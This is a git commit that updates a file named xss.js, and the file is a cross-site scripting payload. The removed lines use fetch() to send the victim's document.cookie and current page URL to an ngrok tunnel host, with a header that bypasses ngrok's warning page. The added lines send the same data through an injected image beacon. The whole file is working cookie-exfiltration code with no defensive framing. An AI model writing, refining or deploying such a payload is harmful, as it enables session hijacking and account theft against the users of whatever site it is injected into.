d3f6529e302a678259486bdcae83f7337cd3e3ab
Michael Valan <111842238+michaelvalan@users.noreply.github.com>
2024-12-09 07:48:17 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,9 +1,6 @@
-fetch('https://osprey-gorgeous-gazelle.ngrok-free.app/?cookies=' + encodeURIComponent(document.cookie) + 
-        '&location=' + encodeURIComponent(window.location.href), {
-    method: 'GET',
-    headers: {
-      'ngrok-skip-browser-warning': 'true'
-    }
-  })
-  .then(response => console.log('Data sent successfully:', response))
-  .catch(error => console.error('Error:', error));
+var img = new Image();
+  img.src = 'https://osprey-gorgeous-gazelle.ngrok-free.app/?cookies=' + 
+            encodeURIComponent(document.cookie) + 
+            '&location=' + 
+            encodeURIComponent(window.location.href);
+  document.body.appendChild(img);
